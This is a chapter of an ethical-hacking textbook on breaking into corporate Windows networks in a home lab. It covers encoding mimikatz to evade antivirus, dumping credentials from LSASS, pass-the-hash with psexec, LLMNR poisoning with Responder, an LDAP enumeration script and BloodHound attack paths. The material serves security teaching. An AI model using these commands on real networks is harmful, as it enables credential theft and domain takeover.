<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" xmlns:ns="http://www.w3.org/2001/10/synthesis" lang="en-us" xml:lang="en-us">
	<head>
		<title>Ethical Hacking: A Hands-on Introduction to Breaking In</title>
		<link href="../styles/9781718501881.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:3776231c-affd-4772-8376-b44c973236be" name="Adept.expected.resource"/>
	</head>
	<body>
		<h2 class="h2" id="ch15"><span epub:type="pagebreak" id="page_305"/><strong><span class="big">15</span><br/>MOVING THROUGH THE CORPORATE WINDOWS NETWORK</strong></h2>
		<p class="verse"><em>An inefficient virus kills its host. A clever virus stays with it.</em></p>
		<p class="chap-au">–James Lovelock</p>
		<div class="imagec">
			<img alt="image" src="../images/common.jpg"/>
		</div>
		<p class="noindents">In this chapter, we’ll explore the architecture of large corporate Windows networks, which typically use a server called a <em>domain controller</em> to manage and secure the network’s machines. As you’ll soon see, if an attacker can compromise the domain controller, the network is theirs.</p>
		<p class="indent">After setting up our own mini corporate environment with a Linux equivalent to the Windows domain controller and single Windows desktop, I’ll demonstrate how an attacker might exploit the protocols used by Windows devices in many corporate environments. I’ll begin by showing you how to extract password hashes and session keys directly from a Windows machine or by intercepting network traffic. Then, I’ll show how to use these session keys and password hashes to access other machines in the network by exploiting vulnerabilities in various networking protocols.</p>
		<p class="indent">The process and protocols we discuss here aren’t exclusively used by Windows systems. For example, the Kerberos authentication protocol is used on Linux, too.</p>
		<h3 class="h3" id="ch15lev1"><span epub:type="pagebreak" id="page_306"/><strong>Creating a Windows Virtual Lab</strong></h3>
		<p class="noindent">We’ll be attacking Windows systems, so we must first create a virtual lab containing a Windows machine. Windows is proprietary, but Microsoft offers trial versions that you can download for free at <em><a href="https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise">https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise</a></em>. Once you’ve downloaded the ISO image, create a new virtual machine in VirtualBox, just like you did in <a href="ch01.xhtml#ch1">Chapter 1</a>. Give your machine 32GB of hard drive space and 4GB of RAM. Then follow the default setup instructions to complete the installation, making sure to create a user account with administrative privileges.</p>
		<h3 class="h3" id="ch15lev2"><strong>Extracting Password Hashes with Mimikatz</strong></h3>
		<p class="noindent">The process of extracting hashes on Windows is similar to the process on Linux (<a href="ch14.xhtml#ch14">Chapter 14</a>), except that instead of extracting hashes from the file <em>/etc/shadow</em>, we retrieve them by dumping the memory of the <em>Local Security Authority Subsystem Service (LSSAS)</em> process. The LSSAS process contains password hashes and security tokens and manages the process of authenticating and communicating with the domain controller.</p>
		<p class="indent">As with Linux, you’ll need administrative privileges to do this. Although you can use searchsploit to find local privilege escalation vulnerabilities for Windows, for simplicity we’ll assume that you’ve compromised a user with administrative privileges. Still, it’s a good practice to keep a list of fresh privilege escalation vulnerabilities in your toolbox for use in real tests or attacks.</p>
		<p class="indent">To dump the credentials, we’ll use <em>mimikatz</em>, a program that contains a collection of tools to help us extract hashes from LSSAS process’s memory. You can manually dump a process’s memory by opening the task manager (CTRL-ALT-DELETE), right-clicking the process, and then selecting <strong>Create dump file</strong>; however, mimikatz automates this process.</p>
		<p class="indent">On Kali Linux, you can download the precompiled executable at <em><a href="https://github.com/gentilkiwi/mimikatz/releases/">https://github.com/gentilkiwi/mimikatz/releases/</a></em>.</p>
		<p class="indent">However, because the tool is so popular, many antivirus systems will detect it and Window’s signature detection algorithm will delete it immediately. Thus, you probably want to obfuscate the strings and the binary. Use Metasploitable’s <span class="literal"><strong>msfencode</strong></span> command to encode the executable with SGN, as discussed in <a href="ch10.xhtml#ch10">Chapter 10</a>. You can encode the mimikatz executable on Kali Linux by running the following:</p>
		<p class="programs">kali@kali:~/Downloads$ <span class="codestrong1">msfencode -t exe -x mimikatz.exe -k -o mimikatz_encoded.exe -e x86/</span><br/>
    
			<img alt="image" src="../images/arrow01.jpg"/> <span class="codestrong1">shikata_ga_nai -c 3</span></p>
		<p class="indent">Now you have an encoded version of mimikatz that you can download on the Windows machine. We can’t directly copy the encoded mimikatz executable from our Kali Linux virtual machine to our Windows virtual machine, so we transfer it over the network, as in previous chapters, by starting a web server on the Kali Linux machine and downloading the file onto the the Windows machine. First, start a Python web server on Kali Linux:</p>
		<p class="programs"><span epub:type="pagebreak" id="page_307"/>kali@kali:~/Downloads$ <span class="codestrong1">python3 -m http.server</span></p>
		<p class="indent">Access the server and download <em>mimikatz_encoded.exe</em> onto your Windows virtual machine. Now let’s extract the password hashes.</p>
		<p class="indent">Remember that you must have admin privileges to extract these hashes. To double-check that your account on the Windows machine has these privileges, use the keyboard shortcut Win-X, and then press A to open the Power-Shell console with admin privileges. Then, use the command <span class="literal"><strong>whoami /groups</strong></span> to see your groups:</p>
		<p class="programs">PS C:\Windows\system32&gt; <span class="codestrong1">whoami /groups</span><br/><br/>GROUP INFORMATION<br/>
-----------------<br/><br/>Group Name                                                    Type             SID<br/>
============================================================= ================ ===============<br/>
   Everyone                                                      Well-known group S-1-1-0<br/><span class="ent">➊</span> NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114</p>
		<p class="indent">Great! You’ve confirmed that this user has administrative privileges <span class="ent">➊</span>. Now navigate to the folder containing mimikatz and run it by entering the following command:</p>
		<p class="programs">PS C:\Users\Kali\mimikatz\&gt; <span class="codestrong1">.\mimikatz_encoded.exe</span><br/><br/>
  .#####.   mimikatz<br/>
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)<br/>
## / \ ##  /   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )<br/>
## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz<br/> '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )<br/>
  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com /<br/><br/><span class="codestrong1">mimikatz #</span></p>
		<p class="indent">Debug privileges is a security policy that allows a process like mimikatz to attach the debugger to the LSSAS process and extract its memory contents. Run the following command to instruct mimikatz to request debug privileges:</p>
		<p class="programs">mimikatz # <span class="codestrong1">privilege::debug</span><br/>Privilege '20' OK</p>
		<p class="indent">If mimikatz successfully gets debug privileges, you will see an <span class="literal">OK</span> message. For best results, run the mimikatz process with administrative privileges; this is because a process with administrative privileges will also be able to get debug privileges.</p>
		<p class="indent">The mimikatz tool supports several modules. For example, the <span class="literal">sekurlsa</span> module allows you to extract hashes from memory:</p>
		<p class="programs"><span epub:type="pagebreak" id="page_308"/>mimikatz # <span class="codestrong1">sekurlsa::logonpasswords</span><br/>
...<br/>Authentication Id : 0 ; 546750 (00000000:000857be)<br/>Session           : Interactive from 1<br/>User Name         : Hacker1<br/>Domain            : DESKTOP-AB3A4NG<br/>Logon Server      : DESKTOP-AB3A4NG<br/>Logon Time        : 2/16/2021 8:17:19 PM<br/>SID               : S-1-5-21<br/>
        msv :<br/>
         [00000003] Primary<br/>
         * Username : Hacker1<br/>
         * Domain   : DESKTOP-AB3A4NG<br/>
      <span class="ent">➊</span> * NTLM     : f773c5db7ddebefa4b0dae7ee8c50aea<br/>
      <span class="ent">➋</span> * SHA1     : e68e11be8b70e435c65aef8ba9798ff7775c361e<br/>
        tspkg :<br/>
         * Username : Hacker1<br/>
         * Domain   : DESKTOP-AB3A4NG<br/>
      <span class="ent">➌</span> * Password : trustno1!<br/>
        wdigest :<br/>
         * Username : Hacker1<br/>
         * Domain   : DESKTOP-AB3A4NG<br/>
         * Password : (null)<br/>
        kerberos :<br/>
         * Username : Hacker1<br/>
         * Domain   : DESKTOP-AB3A4NG<br/>
         * Password : (null)<br/>
        ssp :<br/>
        credman :<br/>
        cloudap :<br/>
...</p>
		<p class="indent">Notice that mimikatz has extracted the SHA-1 and Windows NT LAN Manager hashes of the passwords <span class="ent">➊</span> <span class="ent">➋</span>. In some cases, the LSSAS process will also contain plaintext passwords <span class="ent">➌</span>. Tools like Credential Guard can help protect the LSSAS process from credential dumping attacks like these. However, even in those cases, mimikatz can still capture credentials that the user enters after the system has been compromised.</p>
		<p class="indent">The mimikatz tool is also included in the Metasploit Framework; however, Metasploit won’t always have the most up-to-date version. Still, you could dump the password hashes on the Windows system by running the following command:</p>
		<p class="programs">meterpreter &gt; <span class="codestrong1">load mimikatz</span><br/>meterpreter &gt; <span class="codestrong1">mimikatz_command -f sekurlsa::logonpasswords</span></p>
		<p class="indent">Now that you have the password hashes, you could try to crack them. Alternatively, you could use them to log in to other machines on the corporate <span epub:type="pagebreak" id="page_309"/>network by exploiting the Windows NT LAN Manager protocol in a pass-the-hash attack.</p>
		<h3 class="h3" id="ch15lev3"><strong>Passing the Hash with NT LAN Manager</strong></h3>
		<p class="noindent"><em>NT LAN Manager (NTLM)</em> is a Windows protocol that allows users to authenticate with other machines on the network using their password’s hash. <a href="ch15.xhtml#ch15fig1">Figure 15-1</a> shows what happens when a user logs in to a machine and attempts to access an NTLM-shared folder on a server.</p>
		<div class="image" id="ch15fig1">
			<img alt="image" src="../images/ch15fig01.jpg"/>
		</div>
		<p class="figcap"><em>Figure 15-1: An overview of the authentication process using NTLM</em></p>
		<p class="indent">Several messages are exchanged during this process. When a user logs into a machine with their username and password, that machine stores the username and a hash of the password <span class="ent">➊</span> and then usually deletes the plaintext password. When the user wants to access the server or network folder, the operating system sends the server that user’s username. The server responds by sending a 16-byte nonce called a <em>challenge message</em>. Then, the client encrypts the nonce with the user’s password hash and sends it back to the server <span class="ent">➋</span>. This encrypted nonce is commonly referred to as the <em>challenge-response</em>.</p>
		<p class="indent">The server then forwards the username, the challenge-response, and the challenge message to the domain controller. The domain controller is a server responsible for storing information about users and managing the network’s security policy. Once the domain controller receives the challenge-response <span class="ent">➌</span>, it will verify it by looking up the user’s password hash in the database. It will then use this hash to decrypt the nonce in the challenge-response. <span epub:type="pagebreak" id="page_310"/>If the nonces match, the domain controller will send the server a message telling the server that it has authenticated the user and the server will then grant the user access.</p>
		<p class="indent">Notice that the protocol never uses the plaintext version of the user’s password. This means that if an attacker can obtain a hash of the user’s password, they don’t need to crack the hash to access another machine. They can simply use the hash extracted from the machine to encrypt the challenge-response and authenticate with domain controller. We call this type of attack a <em>pass-the-hash attack</em>.</p>
		<p class="indent">To perform a pass-the-hash attack, use mimikatz to load one of the hashes you extracted from the LSSAS process:</p>
		<p class="programs">mimikatz # <span class="codestrong1">sekurlsa::pth /user:<span class="codeitalic">&lt;User&gt;</span> /domain:<span class="codeitalic">&lt;Domain&gt;</span> /ntlm:<span class="codeitalic">&lt;NTLM Hash&gt;</span></span></p>
		<p class="indent">Replace the <span class="literal">&lt;User&gt;</span>, <span class="literal">&lt;Domain&gt;</span>, and <span class="literal">&lt;NTLM Hash&gt;</span> values with the extracted username, domain, and NTLM password hash.</p>
		<p class="indent">Now you can impersonate a user and access their resources. For example, if our virtual environment contained another Windows machine, you could connect to and access it by using the <span class="literal">psexec</span> tool to run a PowerShell terminal on the other machine:</p>
		<p class="programs">PS&gt; <span class="codestrong1">psexec -i</span> \\<span class="codestrong1"><span class="codeitalic">&lt;Other machine's IP address&gt;</span> powershell</span></p>
		<p class="indent">You can download <span class="literal">psexec</span> for free from Microsoft.</p>
		<h3 class="h3" id="ch15lev4"><strong>Exploring the Corporate Windows Network</strong></h3>
		<p class="noindent">Once an attacker is inside a network, what should they do next? On corporate networks, they might learn about the network’s devices and the associated security policies by listening for network traffic or querying the domain controller.</p>
		<p class="indent">Large corporations must manage security policies across thousands of devices, so they usually organize machines into a hierarchical structure consisting of organizational units, domains, trees, and forests. An <em>organizational unit (OU)</em> is the lowest level in the hierarchy, and consists of a grouping of users, security groups, and computers. A system administrator is free to choose the structure of OUs. For example, an administrator of a large bank may choose to create an OU for each location, such as for a Virginia branch, a California branch, and a Florida branch. Nested within each OU, the administrator might create two other OUs, one to contain the tellers’ machines and the other for staff accounts. This grouping allows system administrators to assign different privileges to each OU.</p>
		<p class="indent">A collection of OUs is called a <em>domain</em>, which are grouped into trees with parent and child domains. Trees are, in turn, grouped into a forest. A trust relationship is established between the domains in the same tree, thus allowing authorized users to move between domains. For example, a system administrator might want to keep machines at the bank headquarters isolated from those in the bank branches. Thus, the administrator might create two separate domains: <span class="literal">company.headquarters</span> and <span class="literal">company.branches</span>. Later, if the <span epub:type="pagebreak" id="page_311"/>bank acquires a smaller bank that already has a domain infrastructure, the system administrator might connect the domains by making the acquired bank’s domain a child of the bank’s parent domain, <span class="literal">company.branches</span>.</p>
		<p class="indent"><a href="ch15.xhtml#ch15fig2">Figure 15-2</a> shows an organization with one forest, two trees, three domains, and seven OUs.</p>
		<div class="image" id="ch15fig2">
			<img alt="image" src="../images/ch15fig02.jpg"/>
		</div>
		<p class="figcap"><em>Figure 15-2: Visualizing the structure of a corporate network with multiple domains</em></p>
		<p class="indent">The domain controller manages these domains and their security policies and runs four key services: the <em>DNS service</em>, the <em>Active Directory Service (ADS)</em>, the <em>Lightweight Directory Access Protocol (LDAP)</em> service, and the <em>Kerberos</em> authentication service. Let’s begin by looking at the DNS Service.</p>
		<h3 class="h3" id="ch15lev5"><strong>Attacking the DNS Service</strong></h3>
		<p class="noindent">The DNS service is a key part of the domain controller. It allows machines in the domain to find the IP addresses of other machines on the network. For example, a file server might contain a shared network folder called <em>//Patient Records/</em>. When a user enters <em>//PatientRecords/</em> into their file explorer, the operating system will communicate with the domain controller’s DNS server to find the file server’s IP address. If the DNS service contains an entry for <em>//PatientRecords/</em>, it will respond with the corresponding IP address. The file explorer will then attempt to connect to that server and access the files (assuming that it has permission to do so).</p>
		<p class="indent">However, if the DNS lookup fails—for example, if the user mistypes the name, perhaps forgetting the <em>s</em> and typing <em>//PatientRecord/</em>, instead—the operating system will fall back on a less secure protocol called <em>Link-Local Multicast Name Resolution (LLMNR)</em> to discover a machine on the network that can respond to the request. LLMNR is a broadcast protocol, so any machine on the network can respond to the request. This allows attackers to respond with a malicious message, an attack called <em>LLMNR poisoning</em>. <a href="ch15.xhtml#ch15fig3">Figure 15-3</a> shows the steps in an LLMNR poisoning attack.</p>
		<div class="image" id="ch15fig3">
			<span epub:type="pagebreak" id="page_312"/>
			<img alt="image" src="../images/ch15fig03.jpg"/>
		</div>
		<p class="figcap"><em>Figure 15-3: How DNS failures could result in insecure LLMNR lookups</em></p>
		<p class="indent">The victim generates a DNS request, and this request is sent to the domain controller <span class="ent">➊</span>. The domain controller’s DNS service tells the victim that it couldn’t find the requested entry <span class="ent">➋</span>, so the victim machine resorts to the LLMNR protocol. It broadcasts a message asking if any machines have the <em>//PatientRecord/</em> folder <span class="ent">➌</span>. The attacker will respond with a message to the effect of, “I can help, but you need to authenticate. Send me your NTLM hash” <span class="ent">➍</span>. If the victim’s machine responds to the message, you’ll have captured the user’s NTLM password hash.</p>
		<p class="indent">If LLMNR fails, the client will fall back to the less secure protocol Netbios Name Service (NBT-NS). LLMNR and NBT-NS aren’t the only protocols that are vulnerable to this type of poisoning attack. Suppose that an attacker performs an ARP spoofing attack and pretends to be the DNS server. They could then capture the NTLM hash from correct DNS lookups.</p>
		<p class="indent">You can use the <span class="literal">Responder</span> tool to perform these attacks. It lets you maliciously respond to various network protocols and capture the associated hashes. You can get a copy of <span class="literal">Responder</span> by cloning its GitHub repository to your Kali Linux virtual machine:</p>
		<p class="programs">kali@kali:~$ <span class="codestrong1">git clone https://github.com/lgandx/Responder</span></p>
		<p class="indent">Start <span class="literal">Responder</span> by running it on your Kali Linux virtual machine. Then, enter a dummy folder, such as <em>//PatientRecords/</em>, in the Windows virtual machine:</p>
		<p class="programs">kali@kali:~/Responder$ <span class="codestrong1">sudo python3 Responder.py -I eth0 -v</span><br/>
...<br/>
[+] Poisoners:<br/>
    LLMNR                      [ON]<br/>
    NBT-NS                     [ON]<br/>
    DNS/MDNS                   [ON]<br/>
...<br/><br/>
   <span epub:type="pagebreak" id="page_313"/>[+] Listening for events...<br/>
   [HTTP] Sending NTLM authentication request to 10.0.1.26<br/>
   [HTTP] GET request from: 10.0.1.26        URL: /<br/>
   [HTTP] Host             : patientrecord<br/>
   [HTTP] NTLMv2 Client   : 10.0.1.26<br/>
   [HTTP] NTLMv2 Username : DESKTOP-AB3A4NG\Hacker1<br/><span class="ent">➊</span> [HTTP] NTLMv2 Hash     : Hacker1::DESKTOP-AB3A4NG:XXXXXXXXXX...........</p>
		<p class="indent">The <span class="literal">-I</span> option specifies the interfaces it will listen and respond on, and <span class="literal">-v</span> says to generate verbose output. You’ll find the NTLMv2 hash that was captured during the attack <span class="ent">➊</span>. You can now crack this hash using the techniques discussed in <a href="ch12.xhtml#ch12">Chapter 12</a> or use it in a pass-the-hash attack.</p>
		<h3 class="h3" id="ch15lev6"><strong>Attacking Active Directory and LDAP Services</strong></h3>
		<p class="noindent">The second service hosted by the domain controller is the Active Directory service, which is a database of objects in the domain. These objects include users, security policies, and shared machines, such as printers and desktops.</p>
		<p class="indent">The user objects contain information such as usernames and password hashes. Security group objects contain information on the privileges afforded to that group as well as a member attribute that lists users associated with that security group. By storing all user information in a single repository, you can give users access to multiple machines without having to store their usernames and passwords on these devices. This is useful in places like libraries, banks, or corporate offices where users often share machines and printers.</p>
		<p class="indent">Other operating systems besides Windows offer their own directory services. These services, such as the 389 Directory Server and Apple Open Directory, use custom protocols and queries. However, requiring operating systems to implement every directory access protocol is infeasible. Instead, they often implement the LDAP, a standard protocol that devices can use to interface with most directory services. The LDAP service translates LDAP-style queries into the query format supported by the backend directory service. This means that clients have to support only the LDAP protocol because the LDAP service abstracts the backend directory service.</p>
		<p class="indent">The LDAP protocol represents data in the form of a <em>directory information tree (DIT)</em>. <a href="ch15.xhtml#ch15fig4">Figure 15-4</a> shows a DIT for an example version of the <em><a href="http://bank.com">bank.com</a></em> domain.</p>
		<div class="image" id="ch15fig4">
			<span epub:type="pagebreak" id="page_314"/>
			<img alt="image" src="../images/ch15fig04.jpg"/>
		</div>
		<p class="figcap"><em>Figure 15-4: A directory information tree</em></p>
		<p class="indent">At the root of the DIT is the domain. The value <span class="literal">dc=bank, dc=com</span> is the distinguished name, which uniquely identifies a component in the tree. (In this case, <span class="literal">dc</span> doesn’t represent the domain controller, but rather refers to a domain component. A little confusing, I know, but this is standard notation.) Here, the domain <em><a href="http://bank.com">bank.com</a></em> has two domain components: <em>bank</em> and <em>com</em>. Below the domain are two OUs. One of these represents machines and the other OU represents users. The distinguished name for the person with the user id Monique is <span class="literal">dc=bank, dc=com, ou=Staff, ou=Manager, uid=Monique</span>. In this way, in addition to uniquely identifying a component, the distinguished name also identifies the path to the object in the tree.</p>
		<h4 class="h4" id="ch15lev7"><strong><em>Writing an LDAP Query Client</em></strong></h4>
		<p class="noindent">LDAP can be a helpful tool for gaining access to the domain controller. If we gain access to the domain controller, which stores the credentials for all users on the network and can also create user accounts, we control the network. If we can control the domain controller, we can create our own administrator account and log in to any machine we please.</p>
		<p class="indent">However, the credentials we extract from some machine on the network might not necessarily grant us access to the domain controller. Instead, we’ll need to move from machine to machine, extracting more privileged credentials until we find some that give us the access we need. To efficiently do this, you need to understand the structure of the network you’re attacking.</p>
		<p class="indent">Attackers can learn about the structure of the corporate network by querying the LDAP server on the domain controller. For example, an attacker might execute queries to the effect of: “How many machines are on the network?”, “How many users are there?”, or “Which users are members of the administrator group?” By executing queries like these, the attacker can map the network and discover a path to a domain controller, a process known as <em>enumeration</em>.</p>
		<p class="indent">Let’s make these ideas of LDAP queries and enumeration more concrete by writing a Python program that will query an LDAP server. This LDAP <span epub:type="pagebreak" id="page_315"/>client, which we’ll call <em>info_probe.py</em>, will retrieve a list of all the users in the network. We’ll use the <span class="literal">ldap3</span> Python library to develop our client, so install it by using <span class="literal">pip3</span>:</p>
		<p class="programs">kali@kali:~$ <span class="codestrong1">pip3 install ldap3</span></p>
		<p class="indent">Next, we’ll need to connect to the LDAP service using a process called binding. LDAP supports three types of binds: <em>anonymous binds</em>, <em>password binds</em>, and <em>Simple Authentication and Security Layer (SASL) binds</em>. An anonymous bind doesn’t require any authentication, so we’ll start by doing an anonymous bind and then modify our program to do a password bind, which allows us to authenticate using a username and password. We’ll discuss SASL binds when we look at the Kerberos protocol later in the chapter.</p>
		<p class="indent">To avoid having to set up our own LDAP server, we’ll interact with a public demo server called <em>ipa.demo1.freeipa.org</em>, available at <em><a href="https://www.freeipa.org/page/Demo">https://www.freeipa.org/page/Demo</a></em>. Alternatively, you can download the FreeIPA virtual machine and add it to your environment. The FreeIPA virtual machine is the Linux equivalent to a Windows domain controller, and we’ll use it as the domain controller in our environment. The web-based option is easier to set up, but your DIT may change during testing as other people have access to the server. Regardless, I’ll use the web-based option in the examples:</p>
		<p class="programs">from ldap3 import Server, Connection, ALL<br/>server = Server(host = 'ipa.demo1.freeipa.org', get_info=ALL)<br/>Connection(server).bind()<br/>print(server.info)</p>
		<p class="indent">We begin by creating a server object with information about the server to which we want to connect. We set the <span class="literal">get_info</span> option to <span class="literal">ALL</span> so that we can read as much information as possible about the server once we’ve connected. Then we’ll create a connection object and call the <span class="literal">bind</span> method. This connection to LDAP uses an anonymous bind. If our anonymous bind was successful, we’ll print information about the server.</p>
		<p class="indent">Run <em>info_probe.py</em> to check whether we can connect to the server:</p>
		<p class="programs">kali@kali:~$ <span class="codestrong1">python3 info_probe.py</span><br/>DSA info (from DSE):<br/>
  Supported LDAP versions: 2, 3<br/>
  Naming contexts:<br/>
    cn=changelog<br/>
    dc=demo1,dc=freeipa,dc=org<br/>
    o=ipaca<br/>
      ...</p>
		<p class="indent">If you can successfully connect to the server, you’ll see the output shown here. This server information will contain lots of great details, including the LDAP server’s version.</p>
		<p class="indent">Now let’s query the LDAP server to discover more about the network. Most LDAP servers will block unauthorized users from submitting queries, <span epub:type="pagebreak" id="page_316"/>so let’s modify <em>info_probe.py</em> so that it authenticates with the LDAP service. We’ll use the password bind authentication method to connect to the LDAP server and search for all of the users in the domain. The LDAP server has three default accounts, and the password for each one is <strong>Secret123</strong>. However, you can also use the NTLM password hash you extracted from memory to authenticate:</p>
		<p class="programs">from ldap3 import Server, Connection, ALL, SUBTREE<br/>server = Server(host = 'ipa.demo1.freeipa.org', use_ssl=True)<br/>conn = conn = Connection(server, user='uid=admin,cn=users,cn=accounts,dc=demo1<br/>
     
			<img alt="image" src="../images/arrow01.jpg"/>
			 ,dc=freeipa,dc=org', password="Secret123", auto_bind=True)<br/>conn.search(search_base = 'dc=demo1,dc=freeipa,dc=org'<br/>
    ,search_filter = '(objectClass=person)'<br/>
    ,attributes=['cn', 'givenName', 'mail']<br/>
    ,search_scope = SUBTREE)<br/>print(conn.entries)</p>
		<p class="indent">First, we connect to the LDAP server, supplying the user’s distinguished name as the <span class="literal">user</span> parameter. Notice the name specifies the path from the leaf to the root of the DIT. We also set the <span class="literal">auto_bind</span> option to true. The <span class="literal">ldap3</span> library will perform the bind operation as soon as it initiates the connection, saving us an extra line of code. Then, we specify our search query. The <span class="literal">search_base</span> argument represents the starting node in our DIT, and we set it to the root node. The second option allows you to filter the results. We’ll include person objects only. Filters can also include logical operators. For example, the following filter returns person objects with an attribute that starts with <span class="literal">Test: &amp; (objectClass=person) (cn=Test*)</span>. Notice that the logical operation precedes the conditionals. This structure might be different from other query languages you’ve seen. Lastly, we specify the attributes to include.</p>
		<p class="indent">Run the Python program:</p>
		<p class="programs">$ <span class="codestrong1">python3 info_probe.py</span><br/>
[DN: uid=admin,cn=users,cn=accounts,dc=demo1,dc=freeipa,dc=org - STATUS:.<br/>
    cn: Administrator<br/>
, DN: uid=manager,cn=users,cn=accounts,dc=demo1,dc=freeipa,dc=org - STATUS:<br/>
    cn: Test Manager<br/>
    givenName: Test<br/>
    mail: manager@demo1.freeipa.org<br/>
, DN: uid=employee,cn=users,cn=accounts,dc=demo1,dc=freeipa,dc=org - STATUS:<br/>
     
			<img alt="image" src="../images/arrow01.jpg"/>
			 Read<br/>
    cn: Test Employee<br/>
    givenName: Test<br/>
    mail: employee@demo1.freeipa.org<br/>
, DN: uid=helpdesk,cn=users,cn=accounts,dc=demo1,dc=freeipa,dc=org - STATUS:<br/>
     
			<img alt="image" src="../images/arrow01.jpg"/>
			 Read<br/>
    cn: Test Helpdesk<br/>
    givenName: Test<br/>
    <span epub:type="pagebreak" id="page_317"/>mail: helpdesk@demo1.freeipa.org<br/>
]</p>
		<p class="indent">Here, we see the four users contained in the DIT. Because the LDAP server is open, you and other users can modify the tree. When you run the query, you might notice some additional entries.</p>
		<p class="indent">View the network administrator panel by logging in to <em><a href="https://ipa.demo1.freeipa.org/">https://ipa.demo1.freeipa.org/</a></em> with the username <strong>admin</strong> and the password <strong>Secret123</strong>. This panel is what the system administrator sees.</p>
		<h4 class="h4" id="ch15lev8"><strong><em>Using SharpHound and Bloodhound for LDAP Enumeration</em></strong></h4>
		<p class="noindent">Various tools can automate the enumeration process. <em>Sharphound</em> collects information about the network by running LDAP queries, listening to network traffic, and using Windows APIs to extract information from machines on the network. You can download it from <em><a href="https://github.com/BloodHoundAD/SharpHound3/">https://github.com/BloodHoundAD/SharpHound3/</a></em> After SharpHound has finished collecting information, it will output several JSON files that contain information on the users, groups, and machines on the network. We can then copy these files from the compromised machine into the Kali Linux virtual machine and feed them to the <em>BloodHound</em> visualization tool. Bloodhound allows attackers to query the data and visualize the paths (list of machines) that they can use to compromise the DC. <a href="ch15.xhtml#ch15fig5">Figure 15-5</a> shows an illustration of a path.</p>
		<div class="image" id="ch15fig5">
			<img alt="image" src="../images/ch15fig05.jpg"/>
		</div>
		<p class="figcap"><em>Figure 15-5: An illustration of a possible path</em></p>
		<p class="indent"><span epub:type="pagebreak" id="page_318"/>Say that Machine 1 is the machine you compromised. User Jane Jackson is logged in to this machine and has an active session. We can also see that Jane is a member of the Office Admin group, which has administrator access to the file server. This means that we can use Jane’s credentials to access the file server. We can also see that John Johnson has logged in to the file server and has an active session, and that John has administrator access to the domain controller.</p>
		<p class="indent">This means that we can compromise the domain controller by extracting Jane’s credentials and using using them in a pass-the-hash attack to get administrator access to the file server. Once we have administrator access to the file server we can extract John’s credentials and use them to gain access to the domain controller.</p>
		<p class="indent">See Bloodhound’s documentation for more examples: <em><a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/bloodhound-gui.html">https://bloodhound.readthedocs.io/en/latest/data-analysis/bloodhound-gui.html</a></em>. You can also use other tools, such as windapsearch, to query the Active Directory service on the domain controller.</p>
		<h3 class="h3" id="ch15lev9"><strong>Attacking Kerberos</strong></h3>
		<p class="noindent">The Kerberos protocol is a secure alternative to the NTLM protocol. To authenticate users who want to access network resources, Kerberos relies on two services: an authentication server and a ticket-granting service. <a href="ch15.xhtml#ch15fig6">Figure 15-6</a> shows an overview of the Kerberos messages exchanged when a user requests access to a file server.</p>
		<div class="image" id="ch15fig6">
			<img alt="image" src="../images/ch15fig06.jpg"/>
		</div>
		<p class="figcap"><em>Figure 15-6: The Kerberos authentication process</em></p>
		<p class="indent"><span epub:type="pagebreak" id="page_319"/>The client first initiates a connection to the authentication server and requests access to the ticket-granting service <span class="ent">➊</span>. This plaintext message contains the user’s ID, the service ID, the user’s IP address, and the requested lifetime of the ticket-granting ticket. The authentication server will look up the user in the Active Directory service, and if the user exists, the authentication server will retrieve the user’s password hash. The user’s password hash will then be used as a symmetric key to encrypt the authentication server’s response. The authentication server and the user both have a copy of this hash, so only the user and the authentication server can decrypt the message.</p>
		<p class="indent">Next, the authentication server sends two messages, a response and a ticket-granting ticket <span class="ent">➋</span>. Both of these messages are encrypted. The response, which is encrypted using the user’s password hash, contains the service ID, a timestamp, the lifetime of the session, and the session key the user will use to encrypt communications with the ticket-granting service. This message is equivalent to saying, “You’ve been authenticated. If you’re truly the user, you will be able to decrypt this message and extract the session key you can use to communicate securely with the ticket-granting service.” The second message (the ticket-granting ticket) is encrypted with the ticketgranting service’s secret key, meaning that only the ticket-granting service can read it. The message contains the user’s ID, the ticket-granting service’s ID, the time, the user’s IP address, the ticket-granting ticket’s lifetime, and the same session key shared with the client. This ticket is equivalent to the authentication server saying, “Show the ticket-granting service this ticket as proof that you have permission to talk to it. The service will know what to do with it.”</p>
		<p class="indent">The user decrypts the first message using their password hash and extracts the session key <span class="ent">➌</span>. The user then encrypts their user ID and password hash using the session key. This is called the user authenticator. The user will attach the ticket-granting ticket as proof that it has permission to access the ticket-granting service, as well as a plaintext request including the service they wish to access (such as the file service) and the ticket’s requested lifetime.</p>
		<p class="indent">The ticket-granting service verifies the ticket-granting ticket by decrypting it with the ticket-granting service’s secret key <span class="ent">➍</span>. The ticket-granting service then extracts the session key from the decrypted ticket and uses it to decrypt the user authenticator message and extract the user ID. It will then check the Active Directory service to see whether the user can access that service. If the user has permission to do so, the ticket-granting service will generate two messages: a response and a service ticket. The response, which is encrypted with the session key, contains the service ID (for instance, the ID of the file server), a timestamp, a lifetime, and a new filesystem session key that will be used to encrypt communications between the file server and the user. The second message is the service ticket, which is encrypted with the file server’s secret key so that only the file server can decrypt it. The service ticket contains the user ID, service ID, timestamp, and the new <span epub:type="pagebreak" id="page_320"/>filesystem session key. This service ticket uniquely provides this user with access to a specific service.</p>
		<p class="indent">The user decrypts the response message, extracts the file server’s session key ”, and uses this key to encrypt a message requesting access to the file server. The user then sends the request and service ticket to the file server. Lastly, the server will follow the same process as the ticket-granting service <span class="ent">➏</span>. It will first use its secret key to decrypt the service ticket and extract the session key, which it will then use to decrypt the user’s request message. If the file server can decrypt the message, it will authenticate the user and send an access-granted message encrypted with the session key.</p>
		<p class="indent">Is Kerberos secure? Notice that an attacker doesn’t need to have the user’s password hash to request a ticket-granting ticket. Suppose that an attacker sends the user’s ID to the authentication server. In that case, the server will respond with a ticket-granting ticket containing an encrypted session key. The attacker could then attempt to crack the ticket by using Hashcat to perform a dictionary-based attack.</p>
